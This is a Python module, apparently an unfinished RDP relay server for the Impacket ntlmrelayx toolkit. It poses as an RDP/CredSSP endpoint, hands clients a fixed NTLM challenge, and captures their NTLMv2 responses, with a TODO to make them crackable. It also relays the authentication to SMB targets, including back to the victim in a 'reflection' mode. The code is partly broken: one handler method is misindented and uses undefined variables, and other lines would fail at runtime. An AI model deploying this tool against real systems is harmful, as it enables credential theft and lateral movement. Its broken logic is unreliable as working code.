# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# HTTP Relay Server
#
# Authors:
#  Romain Carnus (gosecure)
#
# Description:
#             This is the CredSSP server (RDP and WinRM protocols) which relays the NTLMSSP  messages to other protocols

import socketserver
import socket
import base64
import random
import struct
import string
import threading
from threading import Thread
from six import PY2

from impacket import ntlm, LOG
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS

from impacket.rdp import *
import impacket.ntlm
from OpenSSL import SSL
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor


class RDPHandler(socketserver.BaseRequestHandler):
    def __init__(self, request, client_address, server, select_poll = False):
        print("RDPHandler constructor")
        self.ip, self.port = client_address[:2]
        self.RDPServer = server
        self.connId = threading.currentThread().getName()
        self.timeOut = 60*5
        self.socket = request
        self.select_poll = select_poll
        socketserver.BaseRequestHandler.__init__(self, request, client_address, server)


    def negociateRDP(self,pktdata):
        #Only supported mode: CredSSP for now
        try:
            tpkt = TPKT(pktdata)
            tpdu = TPDU(tpkt['TPDU'])
            rdp_neg_req = RDP_NEG_REQ(tpdu['VariablePart'])
        except:
            LOG.info("Received malformed RDP packet or unable to parse it")
            return None

        if ( rdp_neg_req['requestedProtocols'] | (PROTOCOL_HYBRID & PROTOCOL_SSL) != 0):
            LOG.info("Client requested CredSSP protocol")
        elif ( rdp_neg_req['requestedProtocols'] | (PROTOCOL_SSL) != 0 ):
            LOG.info("Client requested SSL protocol")
        else:
            LOG.info("Client asked for something else ...")
            raise()


        response = TPKT()
        tpdu = TPDU()
        rdp_neg_resp = RDP_NEG_RSP()
        #DO NOT respond with HYBRID_EX:
        rdp_neg_resp['selectedProtocols'] = PROTOCOL_HYBRID
        LOG.info("Responding with CredSSP")
        tpdu['VariablePart'] = rdp_neg_resp.getData()
        tpdu['Code'] = TPDU_CONNECTION_CONFIRM
        response['TPDU'] = tpdu.getData()
        #Does not seem to be necessary:
        #self['SRC-REF'] = 0x3412
        #Flags do not matter much:
        #self['Flags'] = ( EXTENDED_CLIENT_DATA_SUPPORTED | DYNVC_GFX_PROTOCOL_SUPPORTED | NEGRSP_FLAG_RESERVED | RESTRICTED_ADMIN_MODE_SUPPORTED | REDIRECTED_AUTHENTICATION_MODE_SUPPORTED )
        return response

    def handle(self):
        LOG.info("Incoming connection (%s,%d)" % (self.ip, self.port))
        self.RDPServer.addConnection(self.connId, self.ip, self.port)

        #0.handle the RDP_NEG_REQ request (to be removed later)
        buff = self.socket.recv(8192)
        resp = self.negociateRDP(buff)

        if resp is None:
            self.finish()
            return

        self.socket.sendall(resp.getData())

        """
        if rdp_neg_resp['selectedProtocols'] == PROTOCOL_HYBRID:
            #Ok, now switching onto credSSP:
            self.credssphandle()
        else:
            LOG.error("Unsupported protocol")
            raise()
        """
        #TODO: verify if we responded with Credssp
        #Switching now to credssp
        self.credssphandle()

        return

    def obtainNTLMChallenge(self,type1):
        #Reuse of the code sample in smbserver.py:2733
        # Generate the AV_PAIRS
        av_pairs = ntlm.AV_PAIRS()
        serverName = self.RDPServer._serverName
        domainName = self.RDPServer._domainName
        
        ansFlags = 0

        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_56:
           ansFlags |= ntlm.NTLMSSP_NEGOTIATE_56
        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_128:
           ansFlags |= ntlm.NTLMSSP_NEGOTIATE_128
        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH:
           ansFlags |= ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH
        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
           ansFlags |= ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        if type1['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
           ansFlags |= ntlm.NTLMSSP_NEGOTIATE_UNICODE
        if type1['flags'] & ntlm.NTLM_NEGOTIATE_OEM:
           ansFlags |= ntlm.NTLM_NEGOTIATE_OEM

        ansFlags |= ntlm.NTLMSSP_NEGOTIATE_VERSION | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO | ntlm.NTLMSSP_TARGET_TYPE_SERVER | ntlm.NTLMSSP_NEGOTIATE_NTLM | ntlm.NTLMSSP_REQUEST_TARGET

        import calendar
        import time
        av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = serverName.encode('utf-16le')
        av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = domainName.encode('utf-16le')
        av_pairs[ntlm.NTLMSSP_AV_TIME] = struct.pack('<q', (116444736000000000 + calendar.timegm(time.gmtime()) * 10000000) )

        challengeMessage = ntlm.NTLMAuthChallenge()
        challengeMessage['flags']            = ansFlags
        challengeMessage['domain_len']       = len(serverName.encode('utf-16le'))
        challengeMessage['domain_max_len']   = challengeMessage['domain_len']
        challengeMessage['domain_offset']    = 40 + 16
        challengeMessage['challenge']        = b'A'*8
        challengeMessage['domain_name']      = domainName.encode('utf-16le')
        challengeMessage['TargetInfoFields_len']     = len(av_pairs)
        challengeMessage['TargetInfoFields_max_len'] = len(av_pairs)
        challengeMessage['TargetInfoFields'] = av_pairs
        challengeMessage['TargetInfoFields_offset']  = 40 + 16 + len(challengeMessage['domain_name'])
        challengeMessage['Version']          = b'\xff'*8 
        # in mstsc the following version string was found : "\n\x00cE\x00\x00\x00\x0f"
        challengeMessage['VersionLen']       = 8

        return challengeMessage

    def credssphandle(self):
        import ssl
        #1.Start the TLS Server
        LOG.info("Switching to a TLS context")
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        #openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
        #TODO: try to do that as soon as possible
        context.load_cert_chain(certfile="/root/forked-impacket/keys/certificate.pem", keyfile="/root/forked-impacket/keys/key.pem")
        tls = context.wrap_socket(self.socket,server_side=True)

        #With pyopenssl this is painful
        #ctx = SSL.Context(SSL.TLSv1_2_METHOD)
        #ctx.set_cipher_list("TLSv1.2")
        #tls = SSL.Connection(ctx,self.__socket)
        #wait for connections:
        #tls.set_accept_state()
        #tls.accept()

        buff = tls.recv(4096)
        #print str(buff).encode('hex')

        #2.Parse the packet as a TSRequest
        tsreq = TSRequest()
        tsreq.fromString(buff)
        #get the NegoData field of the TSRequest
        type1 = ntlm.NTLMAuthNegotiate()
        type1.fromString(tsreq['NegoData'])

        if type1['message_type'] != "1":
            LOG.info("Received something else than an authentication request")

        # determine the type of it : NTLMSSP/Kerberos/SPNEGO
        #type1.dump()
        if type1[''] == "NTLMSSP\x00" :
            LOG.info("NTLMSSP found")
            LOG.info("OS-version advertised: %s" % (type1['os_version'])) #TODO try to decode this
            if type1['domain_name'] != "" or type1['host_name'] != "":
                LOG.info("Client info: %s\\%s" % (type1['domain_name'],type1['host_name']))
        #else if type1[''] == "KRB5\x00" :
        #    print "KRB5 found"
        else:
            LOG.error("Unknown SSP requested")
            self.finish()
            raise()

        
        #3.if NTLMSSP, relay to targets
        challengeMessage = self.obtainNTLMChallenge(type1)

        """
        type2 = ntlm.NTLMAuthChallenge(domain="local",challenge=b'A'*8)
        type2['Version'] = "\n\x00cE\x00\x00\x00\x0f"
        type2['TargetInfoFields'] = "\n\x00cE\x00\x00\x00\x0f"
        """
        #type2 = NTLMAuthChallenge("NTLMSSP\x00\x02\x00\x00\x00\x1e\x00\x1e\x008\x00\x00\x005\x82\x8a\xe2\xbc\x8f\xa6\xcf\xa8a\x98\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x98\x00\x98\x00V\x00\x00\x00\n\x00cE\x00\x00\x00\x0fD\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x02\x00\x1e\x00D\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x01\x00\x1e\x00D\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x04\x00\x1e\x00D\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x03\x00\x1e\x00D\x00E\x00S\x00K\x00T\x00O\x00P\x00-\x002\x00E\x00A\x00S\x00E\x00I\x00K\x00\x07\x00\x08\x00\xf2\x8c\xc7\xb5&\xf6\xd4\x01\x00\x00\x00\x00")
        try:
            tsreq = TSRequest()
            tsreq['NegoData'] = challengeMessage.getData()
            tsreq['Version'] = 6
            buff = tsreq.getData()
        except:
            LOG.error("Unable to build tsRequest from type2 message")
            self.finish()
            raise()

        tls.sendall(buff)

        #This should be the type3 here:
        buff = tls.recv(4096)
        LOG.info("Received what seems to be the type3 from the client:")
        print(buff.encode('hex'))
        try:
            tsreq.fromString(buff)
            type3 = tsreq['NegoData']
        except:
            LOG.error("Unable to parse packet as tsRequest")
            self.finish()
            raise()

        #TODO: present the type3 net-NTLMv2 data in a crackable format

        #Respond with an authentication error here
        #TODO

        return

    def finish(self):
        # Thread/process is dying, we should tell the main thread to remove all this thread data
        LOG.info("Closing down connection (%s,%d)" % (self.ip, self.port))
        self.RDPServer.removeConnection(self.connId)
        return socketserver.BaseRequestHandler.finish(self)


class RDPRelayHandler(RDPHandler):
    def __init__(self, request, client_address, server, select_poll = False):
        print("RDPRelayHandler constructor")
        RDPHandler.__init__(self, request, client_address, server, select_poll)
        

    def obtainNTLMChallenge(self,type1):
        #Inspired by code in SmbNegotiate (smbrelayserver:110)
        connData = self.RDPServer.getConnectionData(self.connId, checkStatus=False)

        if self.RDPServer.config.mode.upper() == 'REFLECTION':
            self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])

        #Obtain our target list
        self.target = self.targetprocessor.getTarget()

        LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (self.connId, connData['ClientIP'], self.target.scheme,
                                                                                  self.target.netloc))
        try:
            if self.RDPServer.config.mode.upper() == 'REFLECTION':
                # Force standard security when doing reflection
                LOG.debug("Downgrading to standard security")
                extSec = False
                #recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
            else:
                extSec = True
            # Init the correct client for our target
            client = self.init_client(extSec)
        except Exception as e:
            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
            self.targetprocessor.logTarget(self.target)

        #1.Extract the NTLM data from the TSRequest['NegoData']
        #   send it into the client
            client = connData['SMBClient']
            try:
                challengeMessage = self.do_ntlm_negotiate(client, token)
            except Exception:
                # Log this target as processed for this client
                self.targetprocessor.logTarget(self.target)
                # Raise exception again to pass it on to the SMB server
                raise

            if rawNTLM is False:
                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = b'\x01'
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

                respToken['ResponseToken'] = challengeMessage.getData()
            else:
                respToken = challengeMessage

    #Initialize the correct client for the relay target
    def init_client(self,extSec):
        if self.target.scheme.upper() in self.RDPServer.config.protocolClients:
            client = self.RDPServer.config.protocolClients[self.target.scheme.upper()](self.RDPServer.config, self.target, extendedSecurity = extSec)
            client.initConnection()
        else:
            raise Exception('Protocol Client for %s not found!' % self.target.scheme)
        return client

    def do_ntlm_negotiate(self,client,token):
        #Since the clients all support the same operations there is no target protocol specific code needed for now
        return client.sendNegotiate(token)

    def do_ntlm_auth(self,client,SPNEGO_token,challenge):
        #The NTLM blob is packed in a SPNEGO packet, extract it for methods other than SMB
        clientResponse, errorCode = client.sendAuth(SPNEGO_token, challenge)
        return clientResponse, errorCode

class RDPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, server_address, handler_class=RDPHandler, config_parser = None):
        socketserver.TCPServer.__init__(self, server_address, handler_class)
        # List of active connections
        self._serverName = "myserver"
        self._domainName = "mydomain"
        self.config = config_parser
        self.__activeConnections = {}

    def removeConnection(self, name):
        try:
           del(self.__activeConnections[name])
        except:
           pass
        LOG.info("Remaining connections %s" % list(self.__activeConnections.keys()))

    def addConnection(self, name, ip, port):
        self.__activeConnections[name] = {}
        print("Current Connections", self.__activeConnections.keys())
        self.__activeConnections[name]['PacketNum']       = 0
        self.__activeConnections[name]['ClientIP']        = ip
        self.__activeConnections[name]['ClientPort']      = port
        self.__activeConnections[name]['Uid']             = 0
        self.__activeConnections[name]['ConnectedShares'] = {}
        self.__activeConnections[name]['OpenedFiles']     = {}
        #TODO: clean up what is not useful here
        # SID results for findfirst2
        self.__activeConnections[name]['SIDs']            = {}
        self.__activeConnections[name]['LastRequest']     = {}
        self.__activeConnections[name]['SignatureEnabled']= False
        self.__activeConnections[name]['SigningChallengeResponse']= ''
        self.__activeConnections[name]['SigningSessionKey']= b''
        self.__activeConnections[name]['Authenticated']= False

    def getActiveConnections(self):
        return self.__activeConnections

    def setConnectionData(self, connId, data):
        self.__activeConnections[connId] = data
        #print "setConnectionData" 
        #print self.__activeConnections

    def getConnectionData(self, connId, checkStatus = True):
        conn = self.__activeConnections[connId]
        if checkStatus is True:
            if ('Authenticated' in conn) is not True:
                # Can't keep going further
                raise Exception("User not Authenticated!")
        return conn

class RDPRelayServer(Thread):
    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):
        LOG.info("Setting up RDP Server")

        if self.config.listeningPort:
            rdpport = self.config.listeningPort
        else:
            rdpport = 3389
            #If a proxy service is started (ie. bettercap) should be listening on a different port

        # changed to read from the interfaceIP set in the configuration
        self.server = RDPServer((self.config.interfaceIp, rdpport), RDPRelayHandler, self.config)
        #self.server = RDPServer((self.config.interfaceIp, rdpport), RDPHandler, self.config)

        try:
             self.server.serve_forever()
        except KeyboardInterrupt:
             pass
        LOG.info('Shutting down RDP Server')
        self.server.server_close()